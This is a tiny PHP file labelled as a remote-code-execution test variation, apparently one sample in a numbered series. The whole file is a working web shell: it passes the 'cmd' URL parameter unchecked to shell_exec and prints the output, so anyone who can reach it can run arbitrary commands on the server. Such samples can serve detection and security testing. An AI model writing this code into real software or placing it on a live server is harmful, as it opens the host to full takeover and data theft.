<?php
// RCE test variation #767
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>